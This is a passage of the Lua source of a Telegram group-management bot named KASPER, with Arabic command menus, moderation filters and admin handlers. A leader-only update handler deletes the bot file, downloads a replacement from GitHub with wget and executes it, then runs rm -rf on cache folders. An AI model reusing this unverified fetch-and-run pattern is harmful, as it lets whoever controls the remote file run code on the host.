✟︙ايديي 
✟︙معرفي 
✟︙اسمي 
✟︙ايدي 
✟︙الالعاب 
✟︙سمايلات 
✟︙ترتيب 
✟︙حزوره 
✟︙العكس 
✟︙المحيبس 
✟︙امثله
✟︙كت تويت
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • 
✟︙المختلف
✟︙رياضيات
✟︙انكليزي
✟︙خمن
✟︙معلوماتي 
✟︙القوانين 
✟︙السورس 
✟︙المطور 
✟︙تاك للكل 
✟︙بيع نقاطي
✟︙نسبه الحب 
✟︙احسب عمرك
✟︙مسح رسائلي 
✟︙ايدي بالرد 
✟︙الرتبه بالرد 
✟︙هينه بالرد   
✟︙بوسه بالرد 
✟︙بوسها بالرد 
✟︙رابط الحذف 
✟︙رسائلي اليوم 
✟︙مشاهده المنشور 
✟︙ايدي المجموعه 
✟︙اسم المجموعه 
✟︙رفع « » تنزيل مطي 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙رتبته + المعرف 
✟︙كول + الكلمه 
✟︙هينه + المعرف 
✟︙صورتي  + الرقم 
✟︙الحساب + الايدي 
✟︙طقس + اسم المدينه 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end 
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م4$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help41'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help41'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help41'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help4', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^م٤$") or text:match("^م4$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help4')
local text =  [[
✟︙اوامر الوضع
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙تعيين الايدي ) لتغير الايدي الافتراضي
✟︙مسح الايدي ) لسترجاع الايدي الافتراضي
✟︙تغيير الايدي ) لتعيين كلايش تلقائيه للايدي
✟︙تعيين عدد الكتم ) لتعيين عدد تحذير الشعار
          • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙ضع + احد الاوامر ادناه 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙رابط  
✟︙صوره
✟︙شعار
✟︙تكرار + العدد 
✟︙عدد الاحرف + العدد 
✟︙اسم + الاسم 
✟︙التكرار + بالطرد 
✟︙التكرار + بالمسح 
✟︙الايدي + بالصوره 
✟︙الايدي + بدون صوره 
✟︙الفارسيه + بالتحذير 
✟︙الفارسيه + بدون تحذير 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م5$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help51'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help51'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help51'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help5', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^م٥$") or text:match("^م5$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help5')
local text =  [[
✟︙اوامر رفع المطورين والمشرفين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر رفع المشرفين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙رفع المشرفين
✟︙تنزيل الكل 
✟︙رفع « » تنزيل منشئ
✟︙رفع « » تنزيل مدير
✟︙رفع « » تنزيل ادمن 
✟︙رفع « » تنزيل مميز 
✟︙رفع « » تنزيل ادمن بالكروب
✟︙رفع بكل الصلاحيات { بالكروب }
✟︙الغاء خاصيه التثبيت { بالكروب }
✟︙الغاء خاصيه تغيير الاسم { بالكروب } 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر رفع المطورين 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙رفع « » تنزيل منشئ اساسي
✟︙رفع « » تنزيل مدير عام 
✟︙رفع « » تنزيل ادمن عام  
✟︙رفع « » تنزيل مميز عام 
✟︙رفع « » تنزيل مطور رتبه ثالثه
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م6$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help61'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help61'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help61'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help6', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^م٦$") or text:match("^م6$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help6')
local text =  [[
✟︙اوامر التفعيل والتعطيل 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر تفعيلات المشرفين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙تفعيل الحمايه القصوى
✟︙تفعيل « » تعطيل اللعبه
✟︙تفعيل « » تعطيل الايدي
✟︙تفعيل « » تعطيل الحظر
✟︙تفعيل « » تعطيل الطرد
✟︙تفعيل « » تعطيل الكتم
✟︙تفعيل « » تعطيل الرابط
✟︙تفعيل « » تعطيل الشعار
✟︙تفعيل « » تعطيل اطردني
✟︙تفعيل « » تعطيل نزلني
✟︙تفعيل « » تعطيل تاك الكل
✟︙تفعيل « » تعطيل منو ضافني
✟︙تفعيل « » تعطيل الايدي بالصوره
✟︙تفعيل « » تعطيل جلب الصوره 
✟︙تفعيل « » تعطيل ردود البوت 
✟︙تفعيل « » تعطيل تنبيه التغيرات
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر تفعيلات المطورين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙تفعيل « » تعطيل
✟︙تفعيل « » تعطيل التواصل
✟︙تفعيل « » تعطيل التنبيه
✟︙تفعيل « » تعطيل كل الكروبات 
✟︙تفعيل « » تعطيل البوت الخدمي 
✟︙تفعيل « » تعطيل الاشتراك الاجباري  
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م7$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help71'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help71'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help71'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help7', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^م٧$") or text:match("^م7$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help7') 
local text =  [[
✟︙اوامر مسح القوائم  
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر مسح المشرفين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مسح القوائم
✟︙مسح الرابط
✟︙مسح البوتات
✟︙ مسح المدراء
✟︙مسح الادمنيه
✟︙مسح المقيدين
✟︙مسح المكتومين
✟︙مسح المحظورين
✟︙مسح قائمه المنع
✟︙مسح الاعضاء المميزين 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙اوامر مسح المطورين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مسح المنشئين 
✟︙مسح قائمه العام 
✟︙مسح الايدي العام
✟︙مسح اسم البوت
✟︙مسح كليشه المطور
✟︙مسح ردود المطور 
✟︙مسح كليشه ستارت
✟︙مسح المميزين عام
✟︙مسح المكتومين عام 
✟︙مسح المدراء العامين 
✟︙مسح الادمنيه العامين
✟︙مسح المنشئين الاساسيين
✟︙مسح مطورين الرتبه الثالثه
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer KASPER     -- 
if is_leader(msg) and text:match("^تعيين امر م8$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي الكليشه الان " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help81'..msg.sender_user_id_..'', 'msg')
return false end
if text:match("^(.*)$") then
local KASPER =  KASPERdx1:get(KASPER..'bot:help81'..msg.sender_user_id_..'')
if KASPER == 'msg' then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم حفظ الكليشه الجديده " ,  1, "md")
KASPERdx1:set(KASPER..'bot:help81'..msg.sender_user_id_..'', 'no')
KASPERdx1:set(KASPER..'bot:help8', text)
KASPERdx(msg.chat_id_, msg.id_, 1, text , 1, 'md')
return false end
end
--     By Developer KASPER     -- 
if text:match("^م٨$") or text:match("^م8$") and KASPER11(msg) then
local help = KASPERdx1:get(KASPER..'bot:help8')
local text =  [[
✟︙اوامر المطورين
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙السيرفر 
✟︙الكروبات 
✟︙المجموعات 
✟︙الاحصائيات 
✟︙تحديث 
✟︙اذاعه
✟︙اسم البوت + غادر 
✟︙تحديث السورس 
✟︙توجيه للكل ( بالرد )
✟︙اذاعه بالتوجيه
✟︙نشر بالخاص 
✟︙اذاعه خاص بالتوجيه
✟︙روابط الكروبات
✟︙جلب نسخه الملف
✟︙حظر ( بالرد داخل التواصل )
✟︙الغاء حظر 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙استعاده الاوامر 
✟︙تعيين الاوامر 
✟︙تعيين امر م1 
✟︙تعيين امر م2 
✟︙تعيين امر م3 
✟︙تعيين امر م4 
✟︙تعيين امر م5 
✟︙تعيين امر م6
✟︙تعيين امر م7
✟︙تعيين امر م8
✟︙اضف رد للكل 
✟︙مسح رد للكل   
✟︙حظر عام 
✟︙كتم عام
✟︙الغاء العام 
✟︙ضع دعم 
✟︙حذف الدعم 
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙جلب الملاحظه 
✟︙تنظيف الرسائل 
✟︙تنظيف الكروبات 
✟︙تعيين كليشه ستارت
✟︙جلب كليشه ستارت 
✟︙تعيين ايدي عام
✟︙ردود المطور 
✟︙قائمه العام 
✟︙قائمه المنع العام 
✟︙المميزين عام
✟︙المكتومين عام
✟︙الادمنيه العامين
✟︙المدراء العامين
✟︙مطورين الرتبه الثالثه 
✟︙ضع كليشه المطور
✟︙رفع النسخه ( بالرد للملف ) 
✟︙جلب نسخه الكروبات 
✟︙(وضع او تغيير) اسم البوت    
✟︙نقل احصائيات تشاكي
✟︙نقل احصائيات الزعيم
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙قناة الاشتراك 
✟︙تعيين « » تغيير قناة الاشتراك 
✟︙كشف  + ايدي الكروب
✟︙غادر  + ايدي الكروب 
✟︙فلتر عام  + الكلمه 
✟︙الغاء فلتر عام   + الكلمه 
✟︙ضع ملاحظه  + الملاحظه   
         • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ • ┉ •
✟︙مطور البوت : @]]..SudoKASPER..[[

✟︙قناة السورس : @KASPER_ch
]]
KASPERdx(msg.chat_id_, msg.id_, 1, (help or text), 1, 'html')
end
--     By Developer KASPER     -- 
if text == "تحديث السورس" and is_leader(msg) then 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙جاري تحديث السورس الى الاصدار الجديد ', 1, 'md') 
os.execute('rm -rf KASPER.lua') 
os.execute('wget https://raw.githubusercontent.com/TEAMKASPERS/KASPER/main/KASPER.lua') 
KASPERdx(msg.chat_id_, msg.id_, 1, '✟︙تم تحديث السورس اكتشف المميزات الجديده الان ', 1, 'md') 
dofile('KASPER.lua')
io.popen("rm -rf ~/.telegram-cli/data/audio/*")
io.popen("rm -rf ~/.telegram-cli/data/document/*")
io.popen("rm -rf ~/.telegram-cli/data/photo/*")
io.popen("rm -rf ~/.telegram-cli/data/sticker/*")
io.popen("rm -rf ~/.telegram-cli/data/temp/*")
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*")
io.popen("rm -rf ~/.telegram-cli/data/voice/*")
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
end
--     By Developer KASPER     -- 
if text == 'تحديث' and is_leader(msg) then  
dofile('KASPER.lua')  io.popen("rm -rf ~/.telegram-cli/data/audio/*") 
io.popen("rm -rf ~/.telegram-cli/data/document/*") 
io.popen("rm -rf ~/.telegram-cli/data/photo/*") 
io.popen("rm -rf ~/.telegram-cli/data/sticker/*") 
io.popen("rm -rf ~/.telegram-cli/data/temp/*") 
io.popen("rm -rf ~/.telegram-cli/data/thumb/*") 
io.popen("rm -rf ~/.telegram-cli/data/video/*") 
io.popen("rm -rf ~/.telegram-cli/data/voice/*") 
io.popen("rm -rf ~/.telegram-cli/data/profile_photo/*") 
print("\27[31;47m\n          🚸) تم تحديث البوت (🚸          \n\27[0;34;49m\n") 
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم تحديث البوت ", 1, "md")
end 
--     By Developer KASPER     -- 
if text and text:match("^اضف رسائل (%d+)$") and is_monsh(msg.sender_user_id_, msg.chat_id_) and KASPER11(msg) then  
KASPER0 = text:match("^اضف رسائل (%d+)$")
KASPERdx1:set('KASPER:'..bot_id..'id:user'..msg.chat_id_,KASPER0)  
KASPERdx1:setex('KASPER:'..bot_id.."numadd:user" .. msg.chat_id_ .. "" .. msg.sender_user_id_, 10000, true)  
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل عدد الرسائل ", 1, "md")
KASPERdx(msg.chat_id_, msg.id_, 1,Anwar, 1, 'md') 
end 
--     By Developer KASPER     -- 
if is_leader(msg) then
local text = msg.content_.text_:gsub("[Ss]etprice", "Setnerkh")
if text and text:match("^ضع كليشه المطور$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙ارسل لي كليشه المطور الان ", 1, "md")
KASPERdx1:setex(KASPER.."bot:nerkh" .. msg.chat_id_ .. ":" .. msg.sender_user_id_, 100, true)
end end end
if is_leader(msg) then
if text and text:match("^مسح كليشه المطور$") then
KASPERdx(msg.chat_id_, msg.id_, 1, "✟︙تم مسح كليشه ", 1, "md")
KASPERdx1:del(KASPER.."nerkh", nerkh)
end end
--     By Developer KASPER     -- 
if is_leader(msg) then 
if text == 'معلومات السيرفر' or text == 'السيرفر' then 
KASPERdx(msg.chat_id_, msg.id_, 1, io.popen([[
linux_version=`lsb_release -ds`
memUsedPrc=`free -m | awk 'NR==2{printf "%sMB/%sMB {%.2f%}\n", $3,$2,$3*100/$2 }'`
HardDisk=`df -lh | awk '{if ($6 == "/") { print $3"/"$2" ~ {"$5"}" }}'`
CPUPer=`top -b -n1 | grep "Cpu(s)" | awk '{print $2 + $4}'`
uptime=`uptime | awk -F'( |,|:)+' '{if ($7=="min") m=$6; else {if ($7~/^day/) {d=$6;h=$8;m=$9} else {h=$6;m=$7}}} {print d+0,"days,",h+0,"hours,",m+0,"minutes."}'`
echo '✟︙نظام التشغيل ، \n`'"$linux_version"'`' 
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙الذاكره العشوائيه ،\n`'"$memUsedPrc"'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙وحدة التخزين ،\n`'"$HardDisk"'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙المعالج ،\n`'"`grep -c processor /proc/cpuinfo`""Core ~ {$CPUPer%} "'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙الدخول ،\n`'`whoami`'`'
echo '• ┉ • ┉ • ┉ • ┉ • ┉ •\n✟︙مدة تشغيل السيرفر ،\n`'"$uptime"'`'
]]):read('*a'), 1, 'md')
end end 
--     By Developer KASPER     -- 
end
--     By Developer KASPER     -- 
----------------******* End Code Source KASPER *******---------
-- Number Update 5
--     By Developer KASPER     -- 
elseif (data.ID == "UpdateChat") then
chat = data.chat_
chats[chat.id_] = chat
--     By Developer KASPER     -- 
elseif (data.ID == "UpdateMessageEdited") then
local msg = data
function get_msg_contact(extra, result, success)
local text = (result.content_.text_ or result.content_.caption_)
if result.id_ and result.content_.text_ then
KASPERdx1:set(KASPER..'bot:editid'..result.id_,result.content_.text_)
end 
if not is_vipmem(result.sender_user_id_, result.chat_id_) then
check_filter_words(result, text)
if KASPERdx1:get(KASPER..'editmsg'..msg.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end
if text:match("[Tt][Ee][Ll][Ee][Gg][Rr][Aa][Mm].[Mm][Ee]") or text:match("[Tt][Ll][Gg][Rr][Mm].[Mm][Ee]") or text:match("[Tt].[Mm][Ee]") then
if KASPERdx1:get(KASPER..'bot:links:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[Hh][Tt][Tt][Pp][Ss]://") or text:match("[Hh][Tt][Tt][Pp]://") or text:match(".[Ii][Rr]") or text:match(".[Cc][Oo][Mm]") or text:match(".[Oo][Rr][Gg]") or text:match(".[Ii][Nn][Ff][Oo]") or text:match("[Ww][Ww][Ww].") or text:match(".[Tt][Kk]") or text:match("/") then
if KASPERdx1:get(KASPER..'bot:webpage:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("@") then
if KASPERdx1:get(KASPER..'tags:lock'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("#") then 
if KASPERdx1:get(KASPER..'bot:hashtag:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[\216-\219][\128-\191]") then
if KASPERdx1:get(KASPER..'bot:arabic:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end
if text:match("[A-Z]") or text:match("[a-z]") then
if KASPERdx1:get(KASPER..'bot:english:mute'..result.chat_id_) then
local msgs = {[0] = data.message_id_}
delete_msg(msg.chat_id_,msgs)
end end end end
getMessage(msg.chat_id_, msg.message_id_,get_msg_contact)
--     By Developer KASPER     -- 
elseif (data.ID == "UpdateOption" and data.name_ == "my_id") then  
print('\27[30;32m»» جاري فحص الكروبات الوهميه ««\n\27[1;37m')
local list = KASPERdx1:smembers(KASPER..'bot:userss')  
for k,v in pairs(list) do
getchat(v,function(arg,data)
end) end
local list = KASPERdx1:smembers(KASPER..'bot:groups') 
for k,v in pairs(list) do 
getchat(v,function(arg,data)
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusMember" then
print('\27[30;32m»» البوت عضو في المجموعه\nتم مغادرة المجموعه \n\27[1;37m')
KASPERdx1:srem(KASPER..'bot:groups',v)  
remgroup(v)   
changeChatMemberStatus(v, bot_id, "Left")
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusLeft" then
KASPERdx1:srem(KASPER..'bot:groups',v)  
remgroup(v)   
end
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusKicked" then
print('\27[30;32m»» البوت مطرود في المجموعه\nتم مسح بيانات المجموعه \n\27[1;37m')
KASPERdx1:srem(KASPER..'bot:groups',v)  
remgroup(v)   
end
if data and data.code_ and data.code_ == 400 then
KASPERdx1:srem(KASPER..'bot:groups',v)  
remgroup(v)   
end 
if data and data.type_ and data.type_.channel_ and data.type_.channel_.status_ and data.type_.channel_.status_.ID == "ChatMemberStatusEditor" then
KASPERdx1:sadd(KASPER..'bot:groups',v)
print('\27[30;32m»» البوت ادمن في المجموعه \n\27[1;37m')
addgroup(v)
end end) end end end
-------------------------******* The Best Source *******-------------------------
-- END VERSION (24) KASPER DX 
-- All The File By Developer KASPER : @KKKKF
-- Join In Chennel Source : @KASPER_CH 
-- Join In Explanation Channel : @Learn_KASPER